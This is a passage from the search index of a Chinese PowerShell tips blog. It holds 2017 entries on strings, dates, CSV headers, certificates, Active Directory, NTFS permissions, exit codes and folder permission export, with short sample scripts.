限制文本的长度（第二部分）","text":"以下是确保一段文本不超过指定长度的另一种策略。和前一个技能不同的是，当文本长度小于最大长度时，这段代码不会补齐空格： 1234$text = 'this'$MaxLength = 10$CutOff = [Math]::Min($MaxLength, $text.Length)$text.Substring(0,$CutOff) 关键点在 Min() 函数，它决定了两个值中小的哪个。","link":"/2017/03/20/texts-with-maximum-length-part-2/"},{"title":"PowerShell 技能连载 - 不带动词运行 Cmdlet","text":"这是从 PowerShell 1.0 开始就具有的一个特性：调用动词为 “get” 的 cmdlet 可以省略动词。所以调用 “Get-Service“ 时您可以仅执行 “Service“调用 “Get-Date“ 时可以仅执行 “Date“。 以下不是别名，甚至 PowerShell 引擎并不知道为什么它能工作。请试试这些代码： 12PS&gt; DatePS&gt; Get-Command Date 使用这个快捷方式的前提是没有冲突的命令或语法元素。这也是为什么您可以运行 “Get-Process“，但不能运行 “Process“ 的原因：”Process“ 是 PowerShell 语言中的一个保留关键字。","link":"/2017/03/21/running-cmdlets-without-verb/"},{"title":"PowerShell 技能连载 - 调用一个脚本块","text":"可以通过调用操作符，例如 “&amp;“、”.“ 或调用 Invoke() 方法调用在一个脚本块中的代码。 一个区别是当有多于一个结果时的输出：调用操作符返回一个扁平的对象数组，而 Invoke() 返回一个集合： 1234567$code = { Get-Process }$result1 = &amp; $code$result2 = $code.Invoke()$result1.GetType().FullName$result2.GetType().FullName 通过 Invoke() 方法返回的集合拥有额外的方法，例如 RemoveAt() 和 Insert()，它们能够帮您修改结果数据，能高效地插入或删除元素。 您可以手动将一个 cmdlet 的返回值手动转为一个 ArrayList： 1$arrayList = [Collections.ArrayList]@(Get-Process)","link":"/2017/03/22/invoking-a-script-block/"},{"title":"PowerShell 技能连载 - 按区域转换数据","text":"当转换数据（将它转换为不同的数据类型）时，PowerShell 支持两种不同的方式方式。 以下是一个例子： 12[DateTime]'12.1.2017''12.1.2017' -as [DateTime] 两行代码都将一个字符串转为一个 DateTime 对象。第一行代码代表强制转换。它可能成功也有可能失败，并且它总是使用语言中性的格式（US 格式），所以它应为一个 月-日-年 格式。 第二行代表“尝试转换”：该转换要么成功要么静默地返回 $null。该转换遵循当前的区域设置，所以如果您在一个德文系统众运行这段代码，这段文字被解释成 日-月-年 格式。","link":"/2017/03/23/casting-data-with-culture/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 参数验证器","text":"PowerShell 的函数参数支持 ValidateScript 属性，可以关联到一段 PowerShell 代码。当该参数接收到一个值时，该代码将会被调用，并且返回 $true 或 $false。如果该代码返回 $false 则该参数被拒绝。 以下是一个仅接受 Windows 文件夹中存在的文件的文件名的例子： 123456789101112function Get-File{ param ( [Parameter(Mandatory)] [ValidateScript({ Test-Path -Path &quot;$env:windir\\$_&quot; })] [string] $File ) &quot;$File exists in your Windows folder.&quot;} 以下是使用效果： 12345678910111213PS C:\\&gt; Get-File -File explorer.exeexplorer.exe exists in your Windows folder.PS C:\\&gt; Get-File -File something.exeGet-File : Cannot validate argument on parameter 'File'. The &quot; Test-Path -Path &quot;$env:windir\\$_&quot; &quot; validation script for the argument with value &quot;something.exe&quot; did not return a result of True. Determine why the validation script failed, and then try the command again.At line:1 char:16+ Get-File -File something.exe+ ~~~~~~~~~~~~~ + CategoryInfo : InvalidData: (:) [Get-File], ParameterBindingValidationException + FullyQualifiedErrorId : ParameterArgumentValidationError,Get-FilePS C:\\&gt; Get-File -File memory.dmpmemory.dmp exists in your Windows folder.","link":"/2017/03/24/using-a-powershell-parameter-validator/"},{"title":"PowerShell 技能连载 - 处理 LDAP 和日期","text":"LDAP 过滤器是一个快速和强大的从 Active Directory 中获取信息的方法。然而，LDAP 过滤器使用的是一个很底层的日期和时间格式。它基本上是一个很大的整形数。幸运的是 PowerShell 包含多种将实际 DateTime 对象转换为这些数字，以及相反操作的方法。 以下是一个使用 ActiveDirectory 模块中 Get-ADUser 方法来查找所有近期更改了密码的用户的示例代码。如果您没有这个 module，请从 Microsoft 下载免费的 RSAT 工具。 12345678# find all AD Users who changed their password in the last 5 days$date = (Get-Date).AddDays(-5)$ticks = $date.ToFileTime()$ldap = &quot;(&amp;(objectCategory=person)(objectClass=user)(pwdLastSet&gt;=$ticks))&quot;Get-ADUser -LDAPFilter $ldap -Properties * | Select-Object -Property Name, PasswordLastSet","link":"/2017/03/27/working-with-ldap-and-dates/"},{"title":"PowerShell 技能连载 - 使用通配符确定数组是否包含值","text":"当您想了解一个数组是否包含某个指定的元素，PowerShell 提供了 -contains 操作符。然而这个操作符不支持通配符，所以您只能使用精确匹配。 以下是一个帮助您使用通配符过滤数组元素的解决方法： 123456789$a = 'Hanover', 'Hamburg', 'Vienna', 'Zurich'# is the exact phrase present in array?$a -contains 'Hannover'# is ANY phrase present in array that matches the wildcard expression?(@($a) -like 'Ha*').Count -gt 0# list all phrases from array that match the wildcard expressions@($a) -like 'Ha*'","link":"/2017/03/28/determine-if-array-contains-value-using-wildcards/"},{"title":"PowerShell 技能连载 - 管理 NTFS 权限","text":"由于没有内置的管理 NTFS 权限的 cmdlet，所以有越来越多的开源 PowerShell module 实现这个功能。一个有前途的 module 是由 Raimund Andree，一个德国的 Microsoft 工程师写的。他也将在即将到来的 PowerShell 欧洲会议 (www.psconf.eu) 中演讲。 如果您使用的是 PowerShell 5 或已经安装了 PowerShellGet (www.powershellgallery.com)，以下是从 PowerShell Gallery 下载并安装 “NTFSSecurity” module 的方法： 12345# review module detailsFind-Module -Repository PSGallery -Name NTFSSecurity | Select-Object -Property * | Out-GridView# download moduleInstall-Module -Repository PSGallery -Name NTFSSecurity -Scope CurrentUser 要查看所有的新 cmdlet，请试试这段代码： 1234567891011121314151617181920212223242526272829303132333435363738394041PS C:\\&gt; Get-Command -Module NTFSSecurityCommandType Name Version----------- ---- -------Cmdlet Add-NTFSAccess 4.2.3Cmdlet Add-NTFSAudit 4.2.3Cmdlet Clear-NTFSAccess 4.2.3Cmdlet Clear-NTFSAudit 4.2.3Cmdlet Copy-Item2 4.2.3Cmdlet Disable-NTFSAccessInheritance 4.2.3Cmdlet Disable-NTFSAuditInheritance 4.2.3Cmdlet Disable-Privileges 4.2.3Cmdlet Enable-NTFSAccessInheritance 4.2.3Cmdlet Enable-NTFSAuditInheritance 4.2.3Cmdlet Enable-Privileges 4.2.3Cmdlet Get-ChildItem2 4.2.3Cmdlet Get-DiskSpace 4.2.3Cmdlet Get-FileHash2 4.2.3Cmdlet Get-Item2 4.2.3Cmdlet Get-NTFSAccess 4.2.3Cmdlet Get-NTFSAudit 4.2.3Cmdlet Get-NTFSEffectiveAccess 4.2.3Cmdlet Get-NTFSHardLink 4.2.3Cmdlet Get-NTFSInheritance 4.2.3Cmdlet Get-NTFSOrphanedAccess 4.2.3Cmdlet Get-NTFSOrphanedAudit 4.2.3Cmdlet Get-NTFSOwner 4.2.3Cmdlet Get-NTFSSecurityDescriptor 4.2.3Cmdlet Get-NTFSSimpleAccess 4.2.3Cmdlet Get-Privileges 4.2.3Cmdlet Move-Item2 4.2.3Cmdlet New-NTFSHardLink 4.2.3Cmdlet New-NTFSSymbolicLink 4.2.3Cmdlet Remove-Item2 4.2.3Cmdlet Remove-NTFSAccess 4.2.3Cmdlet Remove-NTFSAudit 4.2.3Cmdlet Set-NTFSInheritance 4.2.3Cmdlet Set-NTFSOwner 4.2.3Cmdlet Set-NTFSSecurityDescriptor 4.2.3Cmdlet Test-Path2 4.2.3 当您获取到这些 cmdlet，那么增加或设置 NTFS 权限就轻而易举： 123456$path = 'c:\\test1'mkdir $pathGet-NTFSAccess -Path $Path | Add-NTFSAccess -Account training14\\student14 -AccessRights CreateFiles -AccessType Allow 警告：您需要管理员权限才能更改 NTFS 权限，即使是操作您拥有的文件系统对象。","link":"/2017/03/29/managing-ntfs-permissions1/"},{"title":"PowerShell 技能连载 - 到处 ActiveDirectory 模块","text":"要在 PowerShell 中管理 Active Directory 的用户和计算机，您需要 Microsoft 提供的免费的 RSAT 工具中的 Active Directory 模块。 假设您是一个域管理员并且拥有远程管理域控制器的权限，您也可以从 DC 中导出 ActiveDirectory 模块，并且可以通过隐式远程操作在本地使用它。 以下是使用方法： 123456789$DC = 'dc1' # rename, must be name of one of your domain controllers# create a session$s = New-PSSession -ComputerName dc1# export the ActiveDirectory module from the server to a local module &quot;ADStuff&quot;Export-PSSession -Session $s -OutputModule ADStuff -Module ActiveDirectory -AllowClobber -Force# remove sessionRemove-PSSession $s 当您运行这段代码时，并且您拥有连接到 DC 的权限时，这段代码创建了一个名为 “ADStuff” 的本地 module，其中包含了所有 AD cmdlet。您可以通过隐式远程处理使用 AD cmdlet而不需要安装 RSAT 工具。 警告：由于所有 cmdlet 实际上都是运行在服务器端，所有结果都被序列化后传到本地。这会改变对象类型，所以当您用将对象通过管道从一个 AD cmdlet 传到另一个 AD cmdlet 时，您可能会遇到绑定问题。只要您在管道之外使用 cmdlet，那么一切都没问题。","link":"/2017/03/30/exporting-activedirectory-module/"},{"title":"PowerShell 技能连载 - 检查证书详细信息","text":"如果您想检查和查看一个证书文件的详细信息而不需要将它导入证书存储空间，以下是一个简单的例子： 1234567# replace path with actual path to CER file$Path = 'C:\\Path\\To\\CertificateFile\\test.cer'Add-Type -AssemblyName System.Security[Security.Cryptography.X509Certificates.X509Certificate2]$cert = [Security.Cryptography.X509Certificates.X509Certificate2]::CreateFromCertFile($Path)$cert | Select-Object -Property * 您现在可以存取所有详细信息并获取指纹或检查失效日期： 123456PS C:\\&gt; $cert.Thumbprint7A5A350D95247BB173CDF0867ADA2DBFFCCABDE6PS C:\\&gt; $cert.NotAfterMonday June 12 2017 06:00:00","link":"/2017/03/31/examining-certificate-details/"},{"title":"PowerShell 技能连载 - 检查变量是否为 $NULL","text":"如果您想检查一个变量是否为 $Null（空），请记住始终将 $null 放在比较运算符的左边。大多数情况下，顺序不重要： 123456789PS C:\\&gt; $a = $nullPS C:\\&gt; $b = 12PS C:\\&gt; $a -eq $nullTruePS C:\\&gt; $b -eq $nullFalse 然而，如果一个变量为一个数组，则将数组放在对比操作符左边的行为类似过滤器。这时候顺序变得很关键： 1234567891011121314# this all produces inconsistent and fishy results$a = $null$a -eq $null # works: returns $true$a = 1,2,3$a -eq $null # fails: returns $null$a = 1,2,$null,3,4$a -eq $null # fails: returns $null$a = 1,2,$null,3,4,$null,5$a -eq $null # fails: returns array of 2x $null($a -eq $null).Count 如果您将变量放在左侧，PowerShell 将检测数组内部的 $null 值，并且返回这些值。如果没有 $null 值，则返回 $null。 如果您将变量放在右侧，PowerShell 将检查变量是否为 $null。 12345678910111213# by reversing the operands, all is FINE:$a = $null$null -eq $a # works: $true$a = 1,2,3$null -eq $a # works: $false$a = 1,2,$null,3,4$null -eq $a # works: $false$a = 1,2,$null,3,4,$null,5$null -eq $a # works: $false 可以将 $null 放在比较运算符的左侧而不是右侧，来消除这个问题。","link":"/2017/04/03/comparing-against-null/"},{"title":"PowerShell 技能连载 - 检查操作系统版本","text":"以下是一个简单快速的检查操作系统版本的方法： 123456PS C:\\&gt; [Environment]::OSVersionPlatform ServicePack Version VersionString-------- ----------- ------- ------------- Win32NT 10.0.14393.0 Microsoft Windows NT 10.0.14393.0 所以要检查一个脚本是否运行在一个预定的操作系统上变得十分简单。例如要检查是否运行在 Windows 10 上，请试试这行代码： 123PS C:\\&gt; [Environment]::OSVersion.Version.Major -eq 10True","link":"/2017/04/04/checking-operating-system-version/"},{"title":"PowerShell 技能连载 - 自动定义函数的别名","text":"您也许知道 PowerShell 支持命令的别名。但是您是否知道也可以在函数定义内部为 PowerShell 函数定义别名（PowerShell 4 引入的功能）呢？让我们来看看： 12345678function Get-AlcoholicBeverage{ [Alias('Beer','Drink')] [CmdletBinding()] param() &quot;Here is your beer.&quot;} 这个函数的“正式”名称是 Get-AlcoholicBeverage，但是这个函数也可以通过 “Beer“ 和 “Drink“ 别名来引用。在函数定义时，PowerShell 自动增加了这些别名： 1234CommandType Name----------- ----Alias Beer -&gt; Get-AlcoholicBeverageAlias Drink -&gt; Get-AlcoholicBeverage","link":"/2017/04/05/auto-declaring-alias-names-for-functions/"},{"title":"PowerShell 技能连载 - 检测字符代码 0","text":"有些时候，字符串适用 “\\0“ 作为分隔符。不像其它大多数分隔符，这个分隔符并不显示在文本输出中，但仍然可以用于分割文本。 PowerShell 可以处理包含字符代码 0 的字符串。它用反斜杠后跟着数字 0 来表示。请注意文本需要放在双引号之内，才能将反斜杠序列转换为字节 0。 以下是一个演示如何分割 \\0 分割的文本的例子： 123456# create a sample text$text = &quot;Part 1`0Part 2`0Part 3&quot;# delimiter does not show in output...$text# ...but can be used to split:$text -split &quot;`0&quot;","link":"/2017/04/06/detecting-character-code-0/"},{"title":"PowerShell 技能连载 - 处理长文件路径","text":"以前，当路径长于 256 字符时，Windows 文件系统有时会变得缓慢。在 PowerShell Gallery 有一个 module，增加了一系列 cmdlet，可以快速搜索文件系统，并且支持任意长度的路径。 如果您使用 PowerShell 5 或安装了 PowerShellGet(www.powershellgallery.com)，那么您可以从 PowerShell Gallery 中下载和安装 “PSAlphaFS” module： 1Install-Module -Name PSAlphaFS -Scope CurrentUser 不幸的是，这些 cmdlet 似乎需要完整的管理员特权，而对普通用户会抛出异常。如果您是管理员，您可以以这种方式查找长路径的文件： 12Get-LongChildItem -Path c:\\windows -Recurse -File | Where-Object { $_.FullName.Length -gt 250 }","link":"/2017/04/07/dealing-with-long-file-paths/"},{"title":"PowerShell 技能连载 - 请注意别名","text":"您能指出这段代码的错误吗？ 123456PS C:\\&gt; function r { &quot;This never runs&quot; }PS C:\\&gt; rfunction r { &quot;This never runs&quot; }PS C:\\&gt; 如果您执行函数 “r”，它只会返回函数的源代码。 错误的原因是函数名 “r” 和内置的别名冲突： 12345678PS C:\\&gt; Get-Alias rCommandType Name Version Source----------- ---- ------- ------Alias r -&gt; Invoke-HistoryPS C:\\&gt; 所以请始终确保知道内置的别名——它们的优先级永远比函数或其它命令高。更好的做法是，按照最佳实践，始终用 Verb-Noum 的方式来命名您的函数。","link":"/2017/04/10/beware-of-aliases/"},{"title":"PowerShell 技能连载 - 直接导入证书（第一部分）","text":"可以在任意版本的 PowerShell 中用 .NET 方法将证书安装到计算机中。这将导入一个证书文件到个人存储中： 123456# importing to personal store$Path = 'C:\\Path\\To\\CertFile.cer'$Store = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Store -ArgumentList My, CurrentUser$Store.Open('ReadWrite')$Store.Add($Path)$Store.Close() 您可以打开证书管理器证实这一点： 1PS C:\\&gt; certmgr.msc 如果您想将证书导入到一个不同的存储位置，只需要调整创建存储对象的参数即可。","link":"/2017/04/11/directly-importing-certificates-part-1/"},{"title":"PowerShell 技能连载 - 直接导入证书（第二部分）","text":"在前一个技能中我们演示了如何在任何版本的 PowerShell 中用 .NET 方法导入数字证书。新版本的 PowerShell 有一个 “PKI” module，其中包括了 Import-Certificate cmdlet，导入证书变得更简单了。 1234#requires -Version 2.0 -Modules PKI# importing to personal store$Path = 'C:\\Path\\To\\CertFile.cer'Import-Certificate -FilePath $Path -CertStoreLocation Cert:\\CurrentUser\\My 请注意 Import-Certificate 如何通过 -CertStoreLocation 指定目标存储位置。这个命令返回导入的证书。","link":"/2017/04/12/directly-importing-certificates-part-2/"},{"title":"PowerShell 技能连载 - 将时钟周期转换为日期和时间（第一部分）","text":"有时候您可能会遇到一些奇怪的日期和时间格式，它们可能用的是类似这样的 64 位 integer 数值：636264671350358729。 如果您想将这样的“时钟周期”（Windows 中最小的时间片），只需要将数字转换为 DateTime 类型： 123PS&gt; [DateTime]636264671350358729Thursday, March 30, 2017 10:38:55 类似地，要将一个日期转换为时钟周期，请试试这段代码： 1234PS&gt; $date = Get-Date -Date '2017-02-03 19:22:11'PS&gt; $date.Ticks636217465310000000 比如说，您可以利用这个时钟周期来将日期和时间序列化成非特定区域的格式。","link":"/2017/04/13/converting-ticks-to-date-and-time-part-1/"},{"title":"PowerShell 技能连载 - 将时钟周期转换为日期和时间（第二部分）","text":"在前一个技能中我们解释了如何将用时钟周期数表达的日期时间转换为真实的 DateTime 格式。然而，现实中有两种不同的时钟周期格式，以下是如何转换数字型日期时间信息的概述： 12345678910111213141516PS&gt; $date = Get-Date -Date '2017-02-03 19:22:11'PS&gt; $ticks = $date.TicksPS&gt; $ticks636217465310000000PS&gt; [DateTime]$ticksFriday, February 3, 2017 19:22:11PS&gt; [DateTime]::FromBinary($ticks)Friday, February 3, 2017 19:22:11PS&gt; [DateTime]::FromFileTime($ticks)Friday, February 3, 3617 20:22:11PS&gt; [DateTime]::FromFileTimeUtc($ticks)Friday, February 3, 3617 19:22:11 如您所见，将时钟周期转换为 DateTime 和执行 FromBinary() 静态方法的效果是一样的。但是 FromeFileTime() 做了什么？它似乎把你发送到了遥远的将来。 这个例子显示了到底发生了什么： 123456789101112131415161718PS&gt; $date1 = [DateTime]::FromBinary($ticks)PS&gt; $date2 = [DateTime]::FromFileTime($ticks)PS&gt; $date2 - $date1Days : 584388Hours : 1Minutes : 0Seconds : 0Milliseconds : 0Ticks : 504911268000000000TotalDays : 584388,041666667TotalHours : 14025313TotalMinutes : 841518780TotalSeconds : 50491126800TotalMilliseconds : 50491126800000PS&gt; ($date2 - $date1).Days / 365.251599,96714579055 FromeFileTime() 只是增加了 1601 年（因为闰年，实际计算结果略有出入）。Windows 的某些部分（例如 Active Directory）从 1601 年 1 月 1 日开始计算日期。对于这些情况，请使用 FromeFileTime() 来获取正确的日期时间。","link":"/2017/04/14/converting-ticks-to-date-and-time-part-2/"},{"title":"PowerShell 技能连载 - 用区域性固定的方式序列化日期和时间","text":"当您保存日期和时间到文本中时，例如导出到 CSV 时，或创建文本报告时，DateTime 对象将会按照您的区域设置转换为相应的日期和时间格式： 1234567891011PS&gt; $date = Get-Date -Date '2017-02-03 19:22:11'PS&gt; &quot;$date&quot;02/03/2017 19:22:11PS&gt; $date.ToString()03.02.2017 19:22:11PS&gt; Get-Date -Date $date -DisplayHint DateTimeFreitag, 3. Februar 2017 19:22:11 这些都是和区域有关的格式，所以当其他人打开您的数据，将它转换为真实的日期时间可能会失败。这就是为什么推荐将日期时间信息保存为文本时将它转换为区域无关的 ISO 格式： 1234PS&gt; Get-Date -Date $date -Format 'yyyy-MM-dd HH:mm:ss'2017-02-03 19:22:11PS&gt; 该 ISO 格式重视能正确地转回 DateTime 对象，无论您的机器用的是什么语言： 123PS&gt; [DateTime]'2017-02-03 19:22:11'Friday, February 3, 2017 19:22:11 另外，这种设计保证它们在使用字母排序时顺序是正确的。","link":"/2017/04/17/serializing-date-and-time-in-a-culture-invariant-way/"},{"title":"PowerShell 技能连载 - 确认重复的 CSV 表头（第一部分）","text":"CSV 文件只是文本文件，所以可以很容易地提取它的第一行并检查它的表头。如果您手头没有一个 CSV 文件，这行代码可以快速帮您创建一个： 123PS C:\\&gt; Get-Process | Export-Csv -Path $env:temp\\test.csv -NoTypeInformation -Encoding UTF8 -UseCulturePS C:\\&gt; 现在您可以分析它的表头。这个简单的方法告诉您 CSV 文件中是否有重复的标题（在这个例子中显然不存在）。这段代码假设您的 CSV 文件分隔符是逗号。如果使用一个不同的分隔符，请调整用于分割的字符： 1234567891011$headers = Get-Content $env:temp\\test.csv | Select-Object -First 1$duplicates = $headers.Split(',') | Group-Object -NoElement | Where-Object {$_.Count -ge 2}if ($duplicates.Count -eq 0){ Write-Host 'You are safe!'}else{ Write-Warning 'There are duplicate columns in your CSV file:' $duplicates} 结果如预想的： 123You are safe!PS C:\\&gt; 如果您好奇当遇到重复的标题时会如何失败，请试试这段代码： 1PS C:\\&gt; driverquery /V /FO CSV | Set-Content -Path $env:temp\\test.csv -Encoding UTF8 如果您在一个的文系统中运行这段代码，结果将会类似这样： 12345WARNUNG: There are duplicate columns in your CSV file:Count Name----- ---- 2 &quot;Status&quot; 显然，在本地化时，Microsoft 将 “State” 和 “Status” 两个单词都翻译成了德文的 “Status”，造成了重复的列标题。","link":"/2017/04/18/identifying-duplicate-csv-headers-part-1/"},{"title":"PowerShell 技能连载 - 确认重复的 CSV 表头（第二部分）","text":"当一个 CSV 文件包含重复的表头时，它无法被导入。在前一个技能中我们掩饰了如何检测一个 CSV 文件中重复的表头。以下是一个自动更正重复项的实践。 第一步，您需要一个包含重复表头的 CSV 文件。例如在德文系统中，您可以这样创建一个文件： 1PS C:\\&gt; driverquery /V /FO CSV | Set-Content -Path $env:temp\\test.csv -Encoding UTF8 快速打开该文件并检查它是否确实包含重复项。 1PS C:\\&gt; notepad $env:temp\\test.csv 如果没有重复项，请将某些表头重命名以制造一些重复项，并保存文件。 您现在可以用 Import-Csv 导入 CSV 文件了： 1234567PS C:\\&gt; Import-Csv -Path $env:temp\\test.csv -Delimiter ','Import-Csv : Element &quot;Status&quot; is present already.In Zeile:1 Zeichen:1+ Import-Csv -Path $env:temp\\test.csv -Delimiter ','+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Import-Csv], ExtendedTypeSystemException + FullyQualifiedErrorId : AlreadyPresentPSMemberInfoInternalCollectionAdd,Microsoft.PowerShell.Commands.ImportCsvCommand 这是一个新的名为 Import-CsvWithoutDuplicate 的函数，可以自动处理重复的项： 12345678910111213141516171819202122232425262728293031323334function Import-CsvWithDuplicate($Path, $Delimiter=',', $Encoding='UTF8'){ # get the header line and all header items $headerLine = Get-Content $Path | Select-Object -First 1 $headers = $headerLine.Split($Delimiter) # check for duplicate header names, and if found, add an incremented # number to it $dupDict = @{} $newHeaders = @(foreach($header in $headers) { $incrementor = 1 $header = $header.Trim('&quot;') $newheader = $header # increment numbers until the new name is unique while ($dupDict.ContainsKey($newheader) -eq $true) { $newheader = &quot;$header$incrementor&quot; $incrementor++ } $dupDict.Add($newheader, $header) # return the new header, producing a string array $newheader }) # read the CSV without its own headers.. Get-Content -Path $Path -Encoding $Encoding | Select-Object -Skip 1 | # ..and replace headers with newly created list ConvertFrom-CSV -Delimiter $Delimiter -Header $newHeaders} 通过它，您可以安全地导入 CSV 文件，不会遇到重复的表头： 123456789101112131415161718192021222324252627282930PS C:\\&gt; Import-CsvWithDuplicate -Path $env:temp\\test.csv -Delimiter ','Modulname : 1394ohciAnzeigename : OHCI-konformer 1394-HostcontrollerBeschreibung : OHCI-konformer 1394-HostcontrollerTreibertyp : KernelStartmodus : ManualStatus : StoppedStatus1 : OKBeenden annehmen : FALSEAnhalten annehmen : FALSEAusgelagerter Pool (Bytes) : 4.096Code(Bytes) : 204.800BSS(Bytes) : 0Linkdatum : 16.07.2016 04:21:36Pfad : C:\\WINDOWS\\system32\\drivers\\1394ohci.sysInit(Bytes) : 4.096Modulname : 3wareAnzeigename : 3wareBeschreibung : 3wareTreibertyp : KernelStartmodus : ManualStatus : StoppedStatus1 : OKBeenden annehmen : FALSEAnhalten annehmen : FALSEAusgelagerter Pool (Bytes) : 0(...) 如您所见，这个函数自动将第二个 “Status” 实例重命名为 “Status1”。","link":"/2017/04/19/identifying-duplicate-csv-headers-part-2/"},{"title":"PowerShell 技能连载 - 检测 CSV 的分隔符","text":"当使用 Import-Csv 导入一个 CSV 文件，需要指定一个分隔符。如果用错了，显然会导入失败。您需要事先知道 CSV 文件使用的分隔符。 以下是一个简单的实践，展示了如何判断一个给定的 CSV 文件的分隔符： 123456789101112131415function Get-CsvDelimiter($Path){ # get the header line $headerLine = Get-Content $Path | Select-Object -First 1 # examine header line per character $headerline.ToCharArray() | # find all non-alphanumeric characters Where-Object { $_ -notlike '[a-z0-9äöüß&quot;()]' } | # find the one that occurs most often Group-Object -NoElement | Sort-Object -Descending -Property Count | # return it Select-Object -First 1 -ExpandProperty Name} 以下是一个测试： 1234567891011121314PS&gt; Get-Date | Export-Csv -Path $env:temp\\test.csv -NoTypeInformationPS&gt; Get-CsvDelimiter -Path $env:temp\\test.csv,PS&gt; Get-Date | Export-Csv -Path $env:temp\\test.csv -NoTypeInformation -UseCulturePS&gt; Get-CsvDelimiter -Path $env:temp\\test.csv;PS&gt; Get-Date | Export-Csv -Path $env:temp\\test.csv -NoTypeInformation -Delimiter '#'PS&gt; Get-CsvDelimiter -Path $env:temp\\test.csv#","link":"/2017/04/20/identifying-csv-delimiter/"},{"title":"PowerShell 技能连载 - 弹出 CD 驱动器","text":"以下是一个用 WMI 弹出 CD 驱动器的小函数。它首先向 WMI 请求所有的 CD 驱动器，然后使用 explorer 对象模型导航到该驱动器并调用它的 “Eject” 上下文菜单项。 1234567891011121314function Eject-CD{ $drives = Get-WmiObject Win32_Volume -Filter &quot;DriveType=5&quot; if ($drives -eq $null) { Write-Warning &quot;Your computer has no CD drives to eject.&quot; return } $drives | ForEach-Object { (New-Object -ComObject Shell.Application).Namespace(17).ParseName($_.Name).InvokeVerb(&quot;Eject&quot;) }}Eject-CD","link":"/2017/04/21/ejecting-cd-drive/"},{"title":"PowerShell 技能连载 - 评估 Exit Code（也叫做 Error Level – 第一部分）","text":"当运行一个控制台应用程序时，它通常会返回一个数字型的 exit code。该 exit code 的含义取决于控制台应用程序，要查询应用程序才能理解 exit code 的含义。PowerShell 也会将 exit code 传递给用户。它通过 $LASTEXITCODE 体现。 以下是一个使用 ping.exe 来测试网络响应的例子： 123456789$hostname = 'powershellmagazine.com'# run console-based executable directly# and disregard text results$null = ping.exe $hostname -n 2 -w 2000# instead look at the exit code delivered in# $LASTEXITCODE. Ping.exe returns 0 if a# response was received:$IsOnline = $LASTEXITCODE -eq 0$IsOnline","link":"/2017/04/24/evaluating-exit-codes-aka-error-level-part-1/"},{"title":"PowerShell 技能连载 - 评估 Exit Code（也叫做 Error Level – 第二部分）","text":"当您直接启动一个控制台应用程序时，PowerShell 会返回它的 exit code（也叫做 Error Level），并存储在 $LASTEXITCODE 变量中。然而，如何获取通过 Start-Process 启动的控制台应用程序的 exit code 呢？ 以下是方法： 12345678$hostname = 'powershellmagazine.com'# run the console-based application synchronously in the PowerShell window,# and return the process object (-PassThru)$process = Start-Process -FilePath ping -ArgumentList &quot;$hostname -n 2 -w 2000&quot; -Wait -NoNewWindow -PassThru# the Error Level information is then found in ExitCode:$IsOnline = $process.ExitCode -eq 0$IsOnline","link":"/2017/04/25/evaluating-exit-codes-aka-error-level-part-2/"},{"title":"PowerShell 技能连载 - 评估 Exit Code（也叫做 Error Level – 第三部分）","text":"在 PowerShell 中运行控制台应用程序的迷你系列的第三部分中，有一个小课题：如何独立于 PowerShell 运行一个控制台应用程序，并且当它执行完成后得到通知，并且获取它的 exit code？ 以下是实现方法：以下代码在一个独立（隐藏）的窗口中运行 ping.exe。PowerShell 继续运行并且可以执行任何其它操作。在这个例子中，它在 ping.exe 正忙于 ping 一个主机名的同时打出一系列“点”号。 当 exe 执行完成时，这段代码能获取进程的 ExitCode 信息： 12345678910111213141516171819$hostname = 'powershellmagazine.com'# run the console-based application ASYNCHRONOUSLY in its own# window (PowerShell continues) and return the# process object (-PassThru)# Hide the new window (you can also show it if you want)$process = Start-Process -FilePath ping -ArgumentList &quot;$hostname -n 4 -w 2000&quot; -WindowStyle Hidden -PassThru# wait for the process to complete, and meanwhile# display some dots to indicate progress:do{ Write-Host '.' -NoNewline Start-Sleep -Milliseconds 300} until ($process.HasExited)Write-Host# the Error Level information is then found in ExitCode:$IsOnline = $process.ExitCode -eq 0$IsOnline","link":"/2017/04/26/evaluating-exit-codes-aka-error-level-part-3/"},{"title":"PowerShell 技能连载 - 克隆文件夹结构（含 NTFS 权限） – 第一部分","text":"有些时候您需要重新创建一个嵌套的文件夹结构，并且希望克隆 NTFS 权限。今天我们我们专注第一个步骤：记录一个已有的文件夹结构，包括 SDDL 格式的 NTFS 权限。 我们可以用 Get-FolderStructureWithPermission 函数实现这个任务。它输入一个已存在文件夹的路径，并返回所有子文件夹，包括 SDDL 格式的 NTFS 权限： 123456789101112131415161718192021222324252627function Get-FolderStructureWithPermission{ param ( [String] [Parameter(Mandatory)] $Path ) if ((Test-Path -Path $Path -PathType Container) -eq $false) { throw &quot;$Path does not exist or is no directory!&quot; } Get-ChildItem -Path $Path -Recurse -Directory | ForEach-Object { $sd = Get-Acl -Path $_.FullName $sddl = $sd.GetSecurityDescriptorSddlForm('all') [PSCustomObject]@{ Path = $_.FullName.Substring($Path.Length) SDDL = $sddl } }} 您可以将结果通过管道输出到 Out-GridView，或将它保存到一个变量，或用 Export-Csv 将它写到磁盘中。 123456789101112131415161718192021222324PS C:\\&gt; Get-FolderStructureWithPermission -Path $home | Format-ListPath : \\.dnxSDDL : O:S-1-5-21-2012478179-265285931-690539891-1001G:S-1-5-21-2012478179-265285931-690539891-1001D:(A;OICIID;FA;;;SY)(A;OI CIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2012478179-265285931-690539891-1001)Path : \\.plasterSDDL : O:S-1-5-21-2012478179-265285931-690539891-1001G:S-1-5-21-2012478179-265285931-690539891-1001D:(A;OICIID;FA;;;SY)(A;OI CIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2012478179-265285931-690539891-1001)Path : \\.vscodeSDDL : O:S-1-5-21-2012478179-265285931-690539891-1001G:S-1-5-21-2012478179-265285931-690539891-1001D:(A;OICIID;FA;;;SY)(A;OI CIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2012478179-265285931-690539891-1001)Path : \\.vscode-insidersSDDL : O:S-1-5-21-2012478179-265285931-690539891-1001G:S-1-5-21-2012478179-265285931-690539891-1001D:(A;OICIID;FA;;;SY)(A;OI CIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2012478179-265285931-690539891-1001)Path : \\3D ObjectsSDDL : O:S-1-5-21-2012478179-265285931-690539891-1001G:S-1-5-21-2012478179-265285931-690539891-1001D:(A;OICIID;FA;;;SY)(A;OI 